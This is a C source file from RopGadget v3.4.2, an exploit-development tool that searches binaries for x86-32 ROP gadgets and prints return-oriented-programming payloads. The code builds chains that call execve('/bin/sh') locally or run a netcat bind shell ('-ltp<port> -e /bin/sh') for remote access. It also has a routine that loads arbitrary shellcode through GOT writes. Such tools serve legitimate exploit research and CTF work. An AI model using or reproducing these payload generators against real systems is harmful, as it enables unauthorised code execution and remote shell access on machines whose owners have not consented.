/*
** RopGadget - Release v3.4.2
** Jonathan Salwan - http://twitter.com/JonathanSalwan
** Allan Wirth - http://allanwirth.com/
** http://shell-storm.org
** 2012-11-11
**
** This program is free software; you can redistribute it and/or modify
** it under the terms of the GNU General Public License as published by
** the Free Software Foundation; either version 2 of the License, or
** (at your option) any later version.
**
** This program is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
** GNU General Public License for more details.
**
** You should have received a copy of the GNU General Public License
** along with this program; if not, write to the Free Software
** Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include "ropgadget.h"

#define WORD 4

static void makepartie2(t_list_inst *, int, int);

/* local: partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
static void makepartie1(t_list_inst *list_ins, int local)
{
  int argv_start;
  int envp_start;
  t_rop_writer wr;
  char *second_reg;
  char reg_stack[32] = "pop %"; /* Whatever register we use to point to .data */
  char **argv;

  wr.mov = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, "mov %eax,(%e?x)"));

  second_reg = get_reg(wr.mov->instruction, 0);
  strncat(reg_stack, second_reg, 3);
  free(second_reg);

  wr.reg_target = &reg_stack[0];
  wr.pop_target = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, wr.reg_target));

  wr.reg_data = "pop %eax";
  wr.pop_data = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, wr.reg_data));
  wr.zero_data = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, "xor %eax,%eax"));

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  if (local)
    {
      argv = xmalloc(2 * sizeof(char *));
      argv[0] = "/bin/sh";
      argv[1] = NULL;

      fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.4.2%s\n", BLUE, ENDC);
    }
  else
    {
      argv = xmalloc(4 * sizeof(char *));
      argv[0] = "/usr/bin/netcat";
      argv[1] = xmalloc(9 * sizeof(char));
      argv[2] = "-e/bin/sh";
      argv[3] = NULL;
      sprintf(argv[1], "-ltp%d", bind_mode.port);

      fprintf(stdout, "\t\t%s# execve /bin/sh bindport %d generated by RopGadget v3.4.2%s\n", BLUE, bind_mode.port, ENDC);

    }

  sc_print_argv((const char * const *)argv, &wr, 0, TRUE, WORD, &argv_start, &envp_start);

  if (!local)
    free(argv[1]);
  free(argv);

  makepartie2(list_ins, argv_start, envp_start);
}

/* local: partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
static void makepartie2(t_list_inst *list_ins, int argv_start, int envp_start)
{
  t_asm *pop_ebx;
  t_asm *pop_ecx;
  t_asm *pop_edx;

  int i;
  t_asm *xor_eax;
  t_asm *int_80;
  t_asm *sysenter;
  t_asm *pop_ebp;
  t_asm *inc_eax;

  const char *pop_ebx_inst = "pop %ebx";
  const char *pop_ecx_inst = "pop %ecx";
  const char *pop_edx_inst = "pop %edx";
  const char *xor_eax_inst = "xor %eax,%eax";
  const char *inc_eaxs[] = {"inc %eax", "inc %ax", "inc %al", NULL};
  const char *int_80_inst = "int $0x80";
  const char *sysenter_inst = "sysenter";
  const char *pop_ebp_inst = "pop %ebp";

  pop_ebx = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, pop_ebx_inst));
  pop_ecx = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, pop_ecx_inst));
  pop_edx = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, pop_edx_inst));

  xor_eax = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, xor_eax_inst));

  for (i = 0, inc_eax = NULL; inc_eaxs[i] != NULL && inc_eax == NULL; i++)
    inc_eax = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, inc_eaxs[i]));

  int_80 = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, int_80_inst));
  sysenter = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, sysenter_inst));
  pop_ebp = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, pop_ebp_inst));

  /* set %ebx (program name) */
  sc_print_sect_addr_pop(pop_ebx, pop_ebx_inst, 0, TRUE, WORD);

  /* set %ecx (arguments) */
  sc_print_sect_addr_pop(pop_ecx, pop_ecx_inst, argv_start, TRUE, WORD);

  /* set %edx (environment) */
  sc_print_sect_addr_pop(pop_edx, pop_edx_inst, envp_start, TRUE, WORD);

  /* set %eax => 0 */
  sc_print_solo_inst(xor_eax, WORD);

  /* set %eax => 0xb for sys_execve() */
  for (i = 0; i != 0xb; i++)
    sc_print_solo_inst(inc_eax, WORD);

  if (int_80)
    sc_print_solo_inst(int_80, WORD);
  else if (sysenter && pop_ebp)
    {
      sc_print_sect_addr_pop(pop_ebp, pop_ebp_inst, 0, TRUE, WORD);
      sc_print_solo_inst(sysenter, WORD);
    }
}

void x8632_makecode(t_list_inst *list_ins)
{
  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  makepartie1(list_ins, !bind_mode.flag);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
}

/* partie 1 | import shellcode in ROP instruction */
static void makepartie1_importsc(t_list_inst *list_ins, char *pop_reg)
{
  t_importsc_writer wr;
  wr.pop_reg = pop_reg;

  wr.pop_gad = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, pop_reg));

  wr.mov_gad2 = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, "mov (%e?x),%e?x"));
  wr.mov_gad3 = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, "mov %e?x,%e?x"));
  wr.mov_gad4 = get_gadget_by_addr(tab_x8632, ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)"));

  sc_print_gotwrite(&wr, WORD);
}

void x8632_makecode_importsc(t_list_inst *list_ins, char *pop_reg)
{
  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  makepartie1_importsc(list_ins, pop_reg);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
}
